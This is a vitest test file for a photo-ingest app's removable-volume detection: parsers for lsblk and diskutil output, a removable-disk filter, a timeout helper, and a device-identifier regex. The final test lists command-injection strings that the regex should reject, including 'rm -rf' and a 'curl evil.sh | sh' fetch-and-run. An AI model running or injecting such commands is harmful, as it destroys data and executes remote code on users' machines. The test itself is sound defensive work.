import { describe, it, expect, vi } from 'vitest'
import {
  parseLsblkTree,
  parseDiskutilList,
  isRemovableDisk,
  withDeadline,
  type LsblkTree,
} from './volume-watcher'

/**
 * The lsblk filter, against trees this machine does not have.
 *
 * What is being defended is narrow and specific: the app sweeps what
 * this returns and the path guard trusts it as a root, so a false
 * positive is an offer to ingest, and hand to Drive, the filesystem the
 * machine boots from.
 */
describe('parseLsblkTree', () => {
  /** A USB card reader: RM on the disk, the filesystem on its partition. */
  const cardReader: LsblkTree = {
    blockdevices: [{
      path: '/dev/sdb', type: 'disk', rm: true, hotplug: true, mountpoint: null, fstype: null,
      children: [{
        path: '/dev/sdb1', type: 'part', rm: true, hotplug: true,
        label: 'EOS_DIGITAL', mountpoint: '/run/media/you/EOS_DIGITAL', fstype: 'exfat',
      }],
    }],
  }

  it('finds a mounted card on a removable disk', () => {
    expect(parseLsblkTree(cardReader)).toEqual([{
      path: '/run/media/you/EOS_DIGITAL',
      label: 'EOS_DIGITAL',
      sizeBytes: 0,
      freeBytes: 0,
      fileSystem: 'exfat',
    }])
  })

  it('ignores the removable disk itself, which has no filesystem to sweep', () => {
    expect(parseLsblkTree(cardReader).map(v => v.path)).not.toContain('/dev/sdb')
  })

  it('carries RM down from the disk when the partition does not repeat it', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/sdb', type: 'disk', rm: true,
        children: [{ path: '/dev/sdb1', type: 'part', mountpoint: '/media/card', fstype: 'vfat' }],
      }],
    })
    expect(volumes).toHaveLength(1)
  })

  it('reads the modern `mountpoints` array when `mountpoint` is absent', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/mmcblk0p1', type: 'part', hotplug: true, fstype: 'vfat',
        mountpoints: [null, '/run/media/you/SD'],
      }],
    })
    expect(volumes.map(v => v.path)).toEqual(['/run/media/you/SD'])
  })

  it('takes a built-in SD slot, which reports HOTPLUG but not RM', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/mmcblk0', type: 'disk', rm: false, hotplug: true,
        children: [{
          path: '/dev/mmcblk0p1', type: 'part', rm: false, hotplug: true,
          label: 'NIKON', mountpoint: '/run/media/you/NIKON', fstype: 'exfat',
        }],
      }],
    })
    expect(volumes.map(v => v.label)).toEqual(['NIKON'])
  })

  it('falls back to the mount directory when the card carries no label', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/sdb1', type: 'part', rm: true, label: null,
        mountpoint: '/run/media/you/disk', fstype: 'vfat',
      }],
    })
    expect(volumes[0].label).toBe('disk')
  })

  it('leaves internal disks alone', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/nvme0n1', type: 'disk', rm: false, hotplug: false,
        children: [
          { path: '/dev/nvme0n1p1', type: 'part', mountpoint: '/boot', fstype: 'vfat' },
          { path: '/dev/nvme0n1p2', type: 'part', mountpoint: '/', fstype: 'btrfs' },
        ],
      }],
    })
    expect(volumes).toEqual([])
  })

  it('refuses the root filesystem even on a hotplug-flagged device', () => {
    // A machine booted from an external disk. Removable is true and the
    // mount is real, and sweeping it is still the wrong answer.
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/sda', type: 'disk', rm: true,
        children: [
          { path: '/dev/sda1', type: 'part', mountpoint: '/', fstype: 'ext4' },
          { path: '/dev/sda2', type: 'part', mountpoint: '/home', fstype: 'ext4' },
          { path: '/dev/sda3', type: 'part', mountpoint: '/boot/efi', fstype: 'vfat' },
        ],
      }],
    })
    expect(volumes).toEqual([])
  })

  it('is not fooled by a mount point that merely starts like a system one', () => {
    // "/vardrive" is not inside "/var".
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/sdb1', type: 'part', rm: true, mountpoint: '/vardrive', fstype: 'exfat',
      }],
    })
    expect(volumes.map(v => v.path)).toEqual(['/vardrive'])
  })

  it('skips swap, which reports "[SWAP]" where a path belongs', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{ path: '/dev/zram0', type: 'disk', rm: true, mountpoint: '[SWAP]', fstype: 'swap' }],
    })
    expect(volumes).toEqual([])
  })

  it('skips an unmounted card: there is nothing to read yet', () => {
    const volumes = parseLsblkTree({
      blockdevices: [{
        path: '/dev/sdb', type: 'disk', rm: true,
        children: [{ path: '/dev/sdb1', type: 'part', rm: true, mountpoint: null, fstype: 'exfat' }],
      }],
    })
    expect(volumes).toEqual([])
  })

  it('survives an empty tree and a missing blockdevices key', () => {
    expect(parseLsblkTree({ blockdevices: [] })).toEqual([])
    expect(parseLsblkTree({})).toEqual([])
  })
})

/**
 * The bound on how long a poll may wait.
 *
 * statfs on a stale mount — a card pulled while the kernel still has it
 * mounted — blocks and never returns. The poll clears its re-entry flag
 * in a `finally`, so one call that never settles stops the watcher for
 * the life of the process. This is what keeps that from happening.
 */
describe('withDeadline', () => {
  it('passes a value through when the work finishes in time', async () => {
    await expect(withDeadline(Promise.resolve('ok'), 50)).resolves.toBe('ok')
  })

  it('passes the original rejection through rather than masking it', async () => {
    await expect(withDeadline(Promise.reject(new Error('ENOENT')), 50))
      .rejects.toThrow('ENOENT')
  })

  it('rejects when the work outlives the deadline', async () => {
    await expect(withDeadline(new Promise(() => {}), 10)).rejects.toThrow(/timed out/)
  })

  it('clears its timer, so a resolved call holds nothing open', async () => {
    vi.useFakeTimers()
    try {
      await withDeadline(Promise.resolve(1), 5000)
      // A live timer would still be pending here, and would keep the
      // event loop alive for five seconds on every poll.
      expect(vi.getTimerCount()).toBe(0)
    } finally {
      vi.useRealTimers()
    }
  })
})

/**
 * The macOS filter, against trees this machine does not have.
 *
 * Same stakes as the Linux one: the path guard trusts what comes out of
 * here as a root the renderer may name, so a false positive is an offer
 * to sweep the disk the Mac booted from.
 */
describe('parseDiskutilList', () => {
  it('finds a card on a partitioned disk', () => {
    expect(parseDiskutilList({
      AllDisksAndPartitions: [{
        DeviceIdentifier: 'disk4',
        Partitions: [{
          DeviceIdentifier: 'disk4s1',
          MountPoint: '/Volumes/EOS_DIGITAL',
          VolumeName: 'EOS_DIGITAL',
        }],
      }],
    })).toEqual([{
      deviceId: 'disk4s1',
      mountPoint: '/Volumes/EOS_DIGITAL',
      volumeName: 'EOS_DIGITAL',
    }])
  })

  it('finds a card with no partition table, mounted as the whole disk', () => {
    // An older camera formats the card as bare FAT32. Reading only
    // `Partitions` would ignore exactly these.
    const found = parseDiskutilList({
      AllDisksAndPartitions: [{
        DeviceIdentifier: 'disk4',
        MountPoint: '/Volumes/NIKON',
        VolumeName: 'NIKON',
      }],
    })
    expect(found.map(c => c.deviceId)).toEqual(['disk4'])
  })

  it('walks APFS volumes, which hang off a container rather than a partition', () => {
    const found = parseDiskutilList({
      AllDisksAndPartitions: [{
        DeviceIdentifier: 'disk3',
        APFSVolumes: [
          { DeviceIdentifier: 'disk3s1', MountPoint: '/Volumes/Shoots', VolumeName: 'Shoots' },
        ],
      }],
    })
    expect(found.map(c => c.mountPoint)).toEqual(['/Volumes/Shoots'])
  })

  it('skips unmounted partitions: there is nothing to read yet', () => {
    expect(parseDiskutilList({
      AllDisksAndPartitions: [{
        DeviceIdentifier: 'disk4',
        Partitions: [{ DeviceIdentifier: 'disk4s1', VolumeName: 'EOS_DIGITAL' }],
      }],
    })).toEqual([])
  })

  it('names an unlabelled volume rather than returning an empty string', () => {
    const found = parseDiskutilList({
      AllDisksAndPartitions: [{
        DeviceIdentifier: 'disk4', MountPoint: '/Volumes/Untitled 1',
      }],
    })
    expect(found[0].volumeName).toBe('Untitled')
  })

  it('survives a shape it does not recognise', () => {
    expect(parseDiskutilList({})).toEqual([])
    expect(parseDiskutilList(null)).toEqual([])
    expect(parseDiskutilList({ AllDisksAndPartitions: [null, 7, 'nonsense'] })).toEqual([])
  })
})

describe('isRemovableDisk', () => {
  const card = { Ejectable: true, RemovableMedia: true, Internal: false, BusProtocol: 'USB' }

  it('takes an ejectable card under /Volumes', () => {
    expect(isRemovableDisk(card, '/Volumes/EOS_DIGITAL')).toBe(true)
  })

  it('takes a reader that reports RemovableMedia as a string', () => {
    // The shape has moved across macOS versions; trusting one spelling
    // would silently stop detecting cards after an OS update.
    expect(isRemovableDisk(
      { Ejectable: false, RemovableMedia: 'Removable', Internal: false },
      '/Volumes/SD',
    )).toBe(true)
  })

  it('refuses an internal disk even when it claims to be ejectable', () => {
    expect(isRemovableDisk(
      { Ejectable: true, RemovableMedia: false, Internal: true },
      '/Volumes/Macintosh HD - Data',
    )).toBe(false)
  })

  it('refuses the boot volume', () => {
    expect(isRemovableDisk(card, '/')).toBe(false)
    expect(isRemovableDisk(card, '/Volumes/Macintosh HD')).toBe(false)
  })

  it('refuses a system volume', () => {
    expect(isRemovableDisk(card, '/System/Volumes/Data')).toBe(false)
  })

  it('refuses a network share, which is not media', () => {
    expect(isRemovableDisk(
      { Ejectable: true, RemovableMedia: true, Internal: false, BusProtocol: 'Network' },
      '/Volumes/studio-nas',
    )).toBe(false)
  })

  it('refuses a fixed external drive', () => {
    expect(isRemovableDisk(
      { Ejectable: false, RemovableMedia: false, Internal: false, BusProtocol: 'USB' },
      '/Volumes/Backup',
    )).toBe(false)
  })

  it('refuses anything mounted outside /Volumes', () => {
    expect(isRemovableDisk(card, '/private/tmp/mine')).toBe(false)
  })
})

describe('the macOS device identifier pattern', () => {
  // The one value that reaches a command line. A volume name never
  // does, because whoever formatted the card chose it.
  const ok = (id: string) => /^disk\d+(s\d+)*$/.test(id)

  it('accepts the identifiers the kernel assigns', () => {
    for (const id of ['disk0', 'disk4', 'disk4s1', 'disk4s1s2']) {
      expect(ok(id)).toBe(true)
    }
  })

  it('rejects anything carrying shell metacharacters or a path', () => {
    for (const id of [
      'disk4; rm -rf ~',
      'disk4 && curl evil.sh | sh',
      '$(whoami)',
      '`id`',
      '../../etc/passwd',
      'disk4\nrm -rf /',
      '',
    ]) {
      expect(ok(id)).toBe(false)
    }
  })
})
